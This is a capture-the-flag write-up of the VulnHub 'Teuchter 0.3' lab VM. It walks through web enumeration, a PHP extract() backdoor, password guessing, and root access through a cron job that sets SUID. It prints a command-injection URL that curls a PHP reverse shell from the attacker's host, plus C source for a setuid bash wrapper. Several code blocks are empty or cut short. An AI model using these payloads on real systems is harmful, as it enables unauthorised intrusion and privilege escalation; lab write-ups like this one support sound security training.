## Preface

Today I'm up against the vm hosted on vulnhub called [Teuchter 0.3](
https://www.vulnhub.com/entry/teuchter-03,163/) by knightmare.

```plaintext
Welcome to another boot2root / CTF this one is called Teuchter. The VM is set to grab a DHCP lease on boot. As with my previous VMs, there is a theme, and you will need to snag the flag in order to complete the challenge. Less hochmagandy and more studying is needed for this one!

A word of warning: The VM has a small HDD so please set the disk to non persistent so you can always revert. You may need to set the MAC to 00:0C:29:65:D0:A0 too.

Hints for you:

This VM is designed to be a bit of a joke/troll so a translator might be useful.
The challenge isn't over with root. I've done my usual flag shenanigans.
A bit of info security research and knowing your target helps here.

## Intelligence Gathering

Starting with this few notes, I launched netdiscover to find the vm'ip:
![Net Discover](/assets/vulnhub/teuchter/netdiscover.png)

Then I used nmap to discover open ports as usual:
![IP Scanning](/assets/vulnhub/teuchter/nmap.png)

The scanning result reveals only port 80 is opened with the Apache httpd 2.4.18 running, the OS is Ubuntu. So I browsed it and I could see this:
![Website](/assets/vulnhub/teuchter/website.png)

Then I viewed the webpage's source code, I could see in the comments some possible folders and a little hint:
![Website Source](/assets/vulnhub/teuchter/website-source.png)

At this point I navigated first into the gallery folder and I saw a lot of images with comments:
![Gallery](/assets/vulnhub/teuchter/gallery.png)

Its source code contained some hints in the comments:
![Gallery Source](/assets/vulnhub/teuchter/gallery-source.png)

Then into telly folder I saw an image and two ogv videos:
![Telly](/assets/vulnhub/teuchter/telly.png)

Its source code contained other hints in the comments:
![Telly Source](/assets/vulnhub/teuchter/telly-source.png)

And then I opened the flicks folder but it returned Forbidden!!
![Flicks](/assets/vulnhub/teuchter/flicks.png)

I proceeded with this, launching a dirb scanner by extensions, using the hint found before in the first webpage's source code:
![Flicks Dirb](/assets/vulnhub/teuchter/flicks-dirb.png)

Good. We find a phpinfo.pht file. 

## Vulnerability Analysis

After some google researches I found [this site](https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html). This php backdoor is very interesting and it leverages the extract PHP function. 

## Exploitation

So I tested it uploading a php reverse shell using a trick :stuck_out_tongue_winking_eye: :

```plaintext
http://192.10.2.8/flicks/phpinfo.pht?ctime=system&atime=curl%20http://192.10.2.4/php-reverse-shell.php%20%3E%20php-reverse-shell.php
```
It worked :grinning:!! If we launch a netcat listener we'll receive a shell! Now to have a complete shell, we just have to spawn bash shell with python. Then we can see there are three users (cpgrogan,jkerr,proclaimers):

```plaintext

```

## Post-Exploitation

Navigating into cpgrogan I could see there were an image and a directory inaccessible. I googled a bit and I found [this Wikipedia article](https://en.wikipedia.org/wiki/Clare_Grogan) of Clare Grogan. She is best known as the lead singer of the 1980s new wave music group 'Altered Images'. I tried the images' name and after some time I had her password :wink:!!

```plaintext
www-data@teuchter:/home/cpgrogan$ su cpgrogan
su cpgrogan
Password: alteredimages
cpgrogan@teuchter:~$
```
Navigating into cpgrogan folder I could see there were kochanski folder, which it is only accessible by the root, and a weeclaire image. The kochanski folder certainly refers to [Kristine Kochanski](http://reddwarf.wikia.com/wiki/Kristine_Kochanski), she is the Navigation Officer on a series called Red Dwarf.

```plaintext
cpgrogan@teuchter:~$ ls -la

Then I browsed the jkerr home folder and I could see a login.txt file and two images:

```plaintext

www-data@teuchter:/home/jkerr$ cat login.txt
cat login.txt
Jim,

I decided to rename your account to jkerr and reset the password
you'll find it in the photo. Just remember the decode password
dosn't have a space.

If you can't figure it out, it's the new name for Jonny & the
Self-Abusers...
```

It seemed that there was a user's password in the photo. So I copied two images found in user folder and I tried to view if there was something inside but nothing :disappointed:. I spent time to search info of [Jim Kerr](https://en.wikipedia.org/wiki/Jim_Kerr) and [Simple Minds](https://en.wikipedia.org/wiki/Simple_Minds), finding that the band scored a string of hit singles, becoming best known internationally for their 1985 hit "[Don't You (Forget About Me)](https://www.youtube.com/watch?v=CdqoNKCCt7A)", from the soundtrack of the film [The Breakfast Club]().

After tried various combinations, I tried the name of the images and finally I had the password under my nose!! :grimacing:

```plaintext
www-data@teuchter:/home/jkerr$ su jkerr
su jkerr
Password: breakfastclub 
jkerr@teuchter:~$
```
At this time I tried to copy the promisedyouamiracle.jpg file but jkerr didn't have permissions to write into flicks folder. So I granted all access permissions to it and then I logged out from jkerr user and I copied into flicks folder with www-data user:

```plaintext
jkerr@teuchter:~$ cp promisedyouamiracle.jpg /var/www/html/flicks
cp promisedyouamiracle.jpg /var/www/flicks
cp: cannot create regular file '/var/www/html/flicks': Permission denied
jkerr@teuchter:~$ chmod 777 promisedyouamiracle.jpg
chmod 777 promisedyouamiracle.jpg
jkerr@teuchter:~$ exit
exit
www-data@teuchter:/home/jkerr$ cp promisedyouamiracle.jpg /var/www/html/flicks
rr$ cp promisedyouamiracle.jpg /var/www/html/flicks
www-data@teuchter:/home/jkerr$ 
```
Now I could download it:
![Promisedyouamiracle JPG](/assets/vulnhub/teuchter/promisedyouamiracle.png)

And I tried to use exiftool and it revealed an encoded string in the Copyright and Rights messages:
![ExifTool](/assets/vulnhub/teuchter/exiftool-promisedyouamiracle.png)

It seemed to be a base64 string, so I tried to decode it:

```plaintext
root@kali:~# echo 'Z2VtaW5pCg==' | base64 -d
gemini
```
Ok! This is the Proclaimers user's password and then I logged in as them. I found [this page](https://en.wikipedia.org/wiki/The_Proclaimers), a Scottish band composed of twin brothers Charlie and Craig Reid. In the folder I could find two directories 500miles and letterfromamerica. The group has a song called "[I'm Gonna Be (500 Miles)](https://www.youtube.com/watch?v=tbNlMtqrYS0)" recorded in 1988 and another one called [Letter From America](https://www.youtube.com/watch?v=ZwYxZNbbAaA). In 500miles folder there were some jpg files and in the letterfromamerica there were two files:

```plaintext

proclaimers@teuchter:~$ cat letterfromamerica/test
So Claire was right about those wildcards
proclaimers@teuchter:~/letterfromamerica$ file semaphore
file semaphore
semaphore: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=504637666875a5d526ef51acfe601c99efc99114, stripped
```

## Privilege Escalation

The files' owner is the root. Therefore I searched if this executable is called from some other programs and I found numpties.sh. If we open it, we can see that a crontab will add the SUID bit to semaphore if the file exists:

```plaintext
proclaimers@teuchter:/$ grep -R "semaphore" /usr/local 2>/dev/null
grep -R "semaphore" /usr/local 2>/dev/null
/usr/local/bin/numpties.sh:## Plant a semaphore in to alert the monitoring system
/usr/local/bin/numpties.sh:if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
/usr/local/bin/numpties.sh:    /bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
/usr/local/bin/numpties.sh:    /bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
proclaimers@teuchter:/$ cat /usr/local/bin/numpties.sh
cat /usr/local/bin/numpties.sh
#!/bin/sh

## Right, time to sort out these numpties that put PHP shells on ma server!

## Steal a copy to examine later
/bin/tar czvf /root/shells.tgz /var/www/html/*.php

## Aww they dobbers with primative Egpytian Encryption can away and raffle themselves
sudo apt-get -y purge openssh-server sftp wget 

## Delete the shells to annoy the eejits
/bin/rm -rf /var/www/html/*.php

## Plant a semaphore in to alert the monitoring system
if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
  then
    /bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
    /bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
fi
```

So I created a C script and I compiled it in local: 

```plaintext
#include <unistd.h>
#include <errno.h>
main( int argc, char ** argv, char ** envp )
{
              if( setgid(getegid()) ) perror( "setgid" );
              if( setuid(geteuid()) ) perror( "setuid" );
              envp = 0; /* blocks IFS attack on non-bash shells */
              system( "/bin/bash", argv, envp );
              perror( argv[0] );
              return errno;
}
```
I started a local python server on port 80:

```plaintext
root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
 and then I replaced it. I waited around 2 minutes before the cron job started and then it changed the SUID:

```plaintext
proclaimers@teuchter:~/letterfromamerica$ rm -rf semaphore

./semaphore
root@teuchter:~/letterfromamerica# id

```

Oh yes privilege escalation succeeded... We are the root :stuck_out_tongue_winking_eye:!! 


## Flag

I viewed the crontab and I could see an interesting hint. Now I navigated into root folder and I found a flag.txt but it said finding correct flag. I navigated into some folders and finally I found a zip file:

```plaintext

Then I started a python webserver on port 8080 and I downloaded it:

```plaintext

```

I tried to unzip it but it had a password. I tried to manual crack it and after some tests I found it 'Teuchter' :smirk:! Inside it we can see a virtual disk image. I mounted it and I could see hint.txt file that contained a hint for a password, and redkola folder that contained a various file format type. Then I tried to mount iso image and I found a jpg file:

Congratulations for the fifth time on capturing this flag!

Yes, I know this VM has really got on your nerves, and that was the main
point...

I decided to have some fun with you, and hopefully you have learned some
new ways to look at things. You know, all this could have been avoided
if Siri just leanred what "outwith" means, I wouldn't have to build this
VM. I'm trolling you again of course!

I hope this VM was fun for you, and I'm sure you can now insult people
in another language :-)

Thanks to mrb3n who shared a joke with me and pushing me to set up a VM
for trolling everyone.

Shout-outs yet again to #vulnhub for hosting a great learning tool and
being a great inspiration to make these VMs. A special thanks goes to
